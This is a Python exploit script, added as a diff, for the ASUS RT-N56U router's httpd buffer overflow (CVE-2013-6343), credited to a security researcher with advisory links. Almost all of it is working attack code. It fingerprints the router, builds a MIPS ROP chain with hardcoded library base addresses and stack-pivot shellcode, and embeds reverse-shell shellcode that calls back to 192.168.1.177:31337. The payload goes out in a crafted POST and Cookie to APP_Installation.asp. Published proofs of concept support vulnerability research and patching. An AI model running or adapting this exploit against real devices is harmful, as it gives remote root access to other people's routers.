@@ -1,0 +1,256 @@
+#!/usr/bin/env python
+
+from time import sleep
+from sys import exit
+import urllib2, signal, struct, base64, socket, ssl
+
+# [*] Title: ASUS RT-N56U Remote Root Shell Exploit - apps_name
+# [*] Discovered and Reported: October 2013
+# [*] Discovered/Exploited By: Jacob Holcomb/Gimppy - Security Analyst @ ISE 
+# [*] Contact: Twitter - @rootHak42
+# [*] Software Vendor: http://asus.com
+# [*] Exploit/Advisory: http://securityevaluators.com, http://infosec42.blogspot.com/
+# [*] Software: httpd (Listens on TCP/80 and TCP/443)
+# [*] Tested Firmware Versions: 3.0.0.4.374_979 (Other versions may be vulnerable)
+# [*] CVE: ASUS RT-N56U Buffer Overflow: CVE-2013-6343
+#
+# [*] Overview:
+#       Multiple ASUS routers including the RT-N56U and RT-AC66U have the ability to install
+#       supplemental applications. This install process is handled by the routers web server,
+#       and is susceptible to multiple Buffer Overflow attacks.
+#
+#       Vulnerable Web Page: APP_Installation.asp 
+#       Vulnerable HTML Parameters: apps_name, apps_flag
+#       Vulneralbe Source File: web.c of httpd code
+#       *Firmware versions prior to the tested version were vulnerable to this attack.
+#
+
+
+def fingerPrint(host, port, netSock):
+
+    fprint = ["RT-N56U"]
+    found = None
+    print " [*] Preparing to fingerprint the server."
+    try:
+        print " [*] Connecting to %s on port %d." % (host, port)
+        netSock.connect((host, port))
+    except Exception as error:
+        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
+        exit(0)
+
+    try:
+        print " [*] Sending fingerprint request."
+        netSock.send("HEAD / HTTP/1.1\r\n\r\n")
+        netData = netSock.recv(1024)
+    except Exception as error:
+        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
+        exit(0)
+
+    try:
+        print " [*] Closing network socket.\n"
+        netSock.close()
+    except Exception as error:
+        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
+
+    for item in fprint:
+        if item in netData:
+            print " [!!!] Target system found in signature list - Result: %s [!!!]\n" % item
+            sleep(1)
+            found = item
+    if found == None:
+        print " [!!!] Server banner doesn't match available targets. [!!!]\n"
+        sleep(1)
+        exit(0)
+    else:
+        return found
+
+
+def targURL():
+
+	while True:
+	
+		URL = raw_input("\n[*] Please enter the URL of the router. Ex. http://192.168.1.1\n>")
+		if len(URL) != 0 and URL[0:7] == "http://" or URL[0:8] == "https://":
+			return URL.lower()
+		else:
+			print "\n\n [!!!] Target URL cant be null and must contain http:// or https:// [!!!]\n"
+			sleep(1)
+
+
+def creds():
+
+    while True:
+
+        User = raw_input("\n[*] Please enter the username for the routers HTTP Basic Authentication:\n>")
+        Pass = raw_input("\n[*] Please enter the password for the supplied username:\n>")
+        if len(User) != 0:
+            return User, Pass
+        else:
+            print "\n [!!!] Username cant be null [!!!]\n"
+            sleep(1)
+
+
+def basicAuth():
+
+    auth = None
+
+    while auth != "yes" and auth != "no":
+        auth = raw_input("\n[*] Would you like to use HTTP Basic Authentication? \"yes\" or \"no\"\n>")
+
+        if auth.lower() == "yes":
+            print "\n\n[!!!] You chose to use HTTP Basic Authentication [!!!]\n"
+            sleep(1)
+            User, Pass = creds()
+            return base64.encodestring("%s:%s" % (User, Pass)).replace("\n", "")
+        elif auth.lower() == "no":
+            print "\n\n[!!!] You chose not to use HTTP Basic Authentication. [!!!]\n"
+            sleep(1)
+            return 0
+        else:
+            print "\n\n[!!!] Error: You entered %s. Please enter \"yes\" or \"no\"! [!!!]\n" % auth
+            sleep(1)
+
+
+def sigHandle(signum, frm): # Signal handler
+     
+    print "\n\n[!!!] Cleaning up the exploit... [!!!]\n"
+    sleep(1)
+    exit(0)
+
+
+def main():
+
+    print """\n[*] Title: ASUS RT-N56U Remote Root Shell Exploit - apps_name
+[*] Discovered and Reported: October 2013
+[*] Discovered/Exploited By: Jacob Holcomb/Gimppy - Security Analyst @ ISE 
+[*] Contact: Twitter - @rootHak42
+[*] Software Vendor: http://asus.com
+[*] Exploit/Advisory: http://securityevaluators.com, http://infosec42.blogspot.com/
+[*] Software: httpd (Listens on TCP/80 and TCP/443)
+[*] Tested Firmware Versions: 3.0.0.4.374_979 (Other versions may be vulnerable)
+[*] CVE: ASUS RT-N56U Buffer Overflow: CVE-2013-6343\n"""
+    signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
+
+    target = targURL()
+    try:
+        print "\n [*] Creating network socket"
+        netSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if target[0:5] == "https":
+            host = target[8:]
+            port = 443
+            print " [*] Preparing SSL/TLS support."
+            https_netSock = ssl.wrap_socket(netSock)
+            finger = fingerPrint(host, port, https_netSock)
+        else:
+            host = target[7:]
+            port = 80
+            finger = fingerPrint(host, port, netSock)
+    except Exception as error:
+        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
+        exit(0)
+
+    auth = basicAuth()
+    junk = "\x42" * 109
+    link_nop = "2Aa3"
+
+    #Base address of ld_uClibc and libc in httpd address space
+    ld_uClibcBase = 0x2aaa8000
+    libcBaseAddr = 0x2ab5f000
+
+    #Rop Chain
+    #<chown+68>:   move    v0,s0 -> sched_yield()
+    #<chown+72>:   lw  ra,28(sp) -> Rop2
+    #<chown+76>:   lw  s0,24(sp)
+    #<chown+80>:   jr  ra
+    #<chown+84>:   addiu   sp,sp,32
+    saved_ra1 = struct.pack("<L", libcBaseAddr + 0x73f4)
+
+    #<_dl_runtime_pltresolve+68>:  lw  ra,36(sp) -> Rop 3
+    #<_dl_runtime_pltresolve+72>:  lw  a0,16(sp)
+    #<_dl_runtime_pltresolve+76>:  lw  a1,20(sp)
+    #<_dl_runtime_pltresolve+80>:  lw  a2,24(sp)
+    #<_dl_runtime_pltresolve+84>:  lw  a3,28(sp)
+    #<_dl_runtime_pltresolve+88>:  addiu   sp,sp,40
+    #<_dl_runtime_pltresolve+92>:  move    t9,v0
+    #<_dl_runtime_pltresolve+96>:  jr  t9 -> jump sched_yield()
+    #<_dl_runtime_pltresolve+100>: nop
+    saved_ra2 = struct.pack("<L", ld_uClibcBase + 0x4e94)
+
+    #<setrlimit64+144>:    addiu   a1,sp,24 -> ptr to stack
+    #<setrlimit64+148>:    lw  gp,16(sp)
+    #<setrlimit64+152>:    lw  ra,32(sp) -> Rop 4
+    #<setrlimit64+156>:    jr  ra -> jump Rop 4
+    #<setrlimit64+160>:    addiu   sp,sp,40
+    saved_ra3 = struct.pack("<L", libcBaseAddr + 0x9ce0)
+
+    #move    t9,a1 -> ptr to jalr sp on stack
+    #addiu   a0,a0,56
+    #jr      t9 -> jump to stack
+    #move    a1,a2
+    saved_ra4 = struct.pack("<L", libcBaseAddr + 0x308fc)
+
+    #sched_yield()
+    sch_yield_s0 = struct.pack("<L", libcBaseAddr + 0x94b0)
+   
+    #Stage 1 Shellcode 
+    jalr_sp =  "\x09\xf8\xa0\x03"
+
+    #Stage 2 Shellcode (Stack Pivot) by Jacob Holcomb of ISE
+    stg2_SC = "\x2c\x08\xbd\x27"# addiu sp, sp, 2092
+    stg2_SC += "\x09\xf8\xa0\x03"# jalr sp
+    stg2_SC += "\x32\x41\x61"#filler for link (branch delay)
+
+    #Stage 3 Shellcode
+    #200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb of ISE
+    #Connects on 192.168.1.177:31337
+    stg3_SC = "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
+    stg3_SC += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
+    stg3_SC += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
+    stg3_SC += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
+    stg3_SC += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
+    stg3_SC += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
+    stg3_SC += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
+    stg3_SC += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
+    stg3_SC += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
+    stg3_SC += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
+    stg3_SC += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
+    stg3_SC += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
+    stg3_SC += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
+
+    payload =  junk + sch_yield_s0 + junk[0:12] + saved_ra1 + junk[0:32]
+    payload += saved_ra2 + junk[0:36] + saved_ra3 + junk[0:24] + jalr_sp
+    payload += link_nop + saved_ra4 + junk[0:4] + stg2_SC
+    postData = "apps_action=install&apps_path=&apps_name=%s&apps_flag=sdb1" % payload
+
+    try:
+        print "\n [*] Preparing the malicious web request."
+        httpRequest = urllib2.Request("%s/APP_Installation.asp" % target, data = postData)
+        httpRequest.add_header("Cookie", "hwaddr=" + junk[0:35] + stg3_SC + "\x42" * (265 - len(stg3_SC)))
+        if auth != 0:
+            httpRequest.add_header("Authorization", "Basic %s" % auth)
+        print " [*] Successfully built HTTP POST request."
+
+    except Exception as error:
+        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
+        exit(0)
+
+    try:
+        print """ [*] Preparing to send Evil PAYLoAd to %s on port %d!\n [*] Payload Length: %d
+ [*] Waiting...""" % (host, port, len(payload))
+        sploit = urllib2.urlopen(httpRequest, None, 6)
+        if sploit.getcode() == 200:
+            print " [*] Server Response: HTTP 200 OK. Get ready 2 catch roOt on TCP/31337!"
+        else:
+            print " [*] Server Response: HTTP %d. Something went wrong!" % sploit.getcode()
+
+    except(urllib2.URLError) as error:
+        print "\n [!!!] Web request error! %s %s [!!!]\n\n" % (type(error), error) 
+        exit(0)
+    except Exception as error:
+        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
+        exit(0)
+    finally:
+        print " [*] %s exploit code has finished.\n" % finger
+
+if __name__ == "__main__":
+	main()	
